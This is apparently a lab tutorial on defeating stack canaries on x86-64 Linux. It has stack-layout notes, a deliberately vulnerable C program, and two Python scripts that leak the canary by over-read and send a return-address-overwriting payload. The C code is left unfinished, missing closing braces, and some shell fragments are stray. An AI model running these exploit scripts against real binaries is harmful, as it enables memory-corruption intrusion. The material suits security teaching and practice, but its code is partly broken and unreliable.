Offset Calculation and Canary Leak

Summary

With NX on, you cannot run shellcode from the stack. With a canary, you cannot overwrite the
return address without knowing the canary. Modern exploitation is therefore: leak, then
control.

Key ideas

  • Stage 1: leak. Over-read past the buffer until the canary appears. No canary modification
    required, so no abort
  • Stage 2: compute. The canary's low byte is always 0x00, so it starts with a null byte
    — you cannot send it over a shell argument, which is why string functions stop there
  • Format string bugs leak the canary directly (%p/%x) without needing an off-by-one
  • With the canary known, the offset becomes: buffer + padding + canary + saved rbp + new rip
  • A leak is also required for ASLR (PIE base or a libc address)

The canary, in detail

 0x7fffffffe2a8  local buffer          <- overflow starts here
 0x7fffffffe2c8  saved RBP             <- 8 bytes
 0x7fffffffe2d0  RETURN ADDRESS        <- 8 bytes

char buf[64];
  • overflow 0..63 fills the buffer
  • bytes 64..71 overwrite the saved RBP
  • bytes 72..79 overwrite the return address

But with a canary the layout is:

 buf[64] | canary 8 bytes (low byte 0x00) | saved RBP | return address

The canary is checked at __stack_chk_fail on function exit. Overflowing corrupts it → abort.

The workaround: stop at the canary, read the 8 bytes (you now know them), then send the
correct canary back plus your payload. The check passes.

Terminology

Term Meaning
Canary Random guard between locals and the return address
__stack_chk_fail glibc handler called when the canary mismatches
Over-read Reading past the buffer without writing — no abort
Null-terminated stop read/gets stop at the canary's leading null
Format string leak %p/%x/%s reading the canary directly
Two-stage exploit Leak first, then exploit
Libc base Where libc is loaded; needed for ret2libc
Info leak Obtaining an address the binary hid from you

# --- two-stage in one script (the real technique) ---
cat > exploit.py <<'PY'
import struct, subprocess, sys
CANARY_OFFSET = 72   # determine with the over-read first

def leak():
    # send exactly up to, but not over, the canary
    payload = b"A" * CANARY_OFFSET
    r = subprocess.run(["./target", payload], capture_output=True, timeout=5)
    out = r.stdout
    idx = out.find(b"A" * CANARY_OFFSET)
    canary = out[idx + CANARY_OFFSET : idx + CANARY_OFFSET + 8]
    return canary

def exploit(canary, ret_addr):
    payload = b"B" * 64 + canary + struct.pack("<Q", 0) + struct.pack("<Q", ret_addr)
    subprocess.run(["./target", payload], capture_output=True, timeout=5)

c = leak()
print(f"  leaked canary: {c.hex()}")
print(f"  low byte is {c[0]:#04x} - {'as expected (null)' if c[0]==0 else 'UNEXPECTED'}")
PY
echo "python3 exploit.py"

Objective: leak a canary with an over-read, prove it is correct, then use it.

#include <stdio.h>
#include <string.h>
#include <unistd.h>

void win(void) { write(1, "you win\n", 8); }

void read_input(char *buf) {
    /* deliberately stops at the canary's leading null byte */
    ssize_t n = read(0, buf, 96);

void vuln(void) {
    char buf[64];
    read_input(buf);
    /* buf is printed; printf("%s") stops at the canary's first null byte */
    printf("%s\n", buf);

# --- 5. the complete two-stage flow ---
cat > exploit.py <<'PY'
#!/usr/bin/env python3
"""
Two-stage canary leak against YOUR OWN lab binary.
Stage 1: over-read the canary. Stage 2: send it back and continue.
"""
import struct, subprocess, sys

TARGET = "./target"
def canary_offset(target, lo=60, hi=120):
    for n in range(lo, hi):
        r = subprocess.run([target], input=b"A"*n, capture_output=True, timeout=5)
        printed = len(r.stdout.rstrip(b"\n"))
        if printed != n and n >= 64:
            return printed
    return None

def leak(target, off):
    r = subprocess.run([target], input=b"A"*off, capture_output=True, timeout=5)
    return r.stdout[off:off+8]

def main():
    off = canary_offset(TARGET)
    if off is None:
        print("  could not determine the canary offset"); return 1
    canary = leak(TARGET, off)
    if len(canary) != 8:
        print("  short read"); return 1
    print(f"  canary offset : {off}")
    print(f"  canary        : {canary.hex()}")
    print(f"  low byte      : {canary[0]:#04x} ({'expected' if canary[0]==0 else 'UNEXPECTED'})")

    marker = struct.pack("<Q", 0x4242424242424242)
    payload = b"A"*off + canary + struct.pack("<Q", 0) + marker
    r = subprocess.run([TARGET], input=payload, capture_output=True, timeout=5)
    print(f"  stage 2 exit  : {r.returncode}")
    print(f"  marker echoed : {b'BBBBBBBB' in r.stdout}")
    print()
    print("  The canary has been defeated. ASLR/PIE is the next obstacle.")
    return 0

if __name__ == "__main__":
    sys.exit(main())
PY

# Canary notes

## Layout on x86-64 Linux
    buf[N] | canary (8 bytes, low byte 0x00) | saved RBP (8) | return address (8)

## Why the low byte is 0x00
`fs:0x28` holds the guard value. Its least significant byte is zeroed so that a
string function writing the canary will terminate at it, making a naive
overwrite via a C string very unlikely to succeed silently.

## The two ways to defeat it
1. **Over-read then echo** - no write happens, so no abort. Requires the read
   to be bounded and the output to reveal the bytes.
2. **Format string** - `%p` reads the value directly. Faster, and the standard
   approach when a format string bug exists.

## What you still need afterwards
- a return-address target: with NX you need libc/stack/heap addresses
- with PIE you need a code or libc base leak (an info leak)
- with Full RELRO the GOT is read-only, so you must target something else

## Detection
SIGABRT (exit 134) means a canary was caught. That is a *successful* defence,
and it leaves evidence in logs.
EOF
cat 05-canary-notes.md
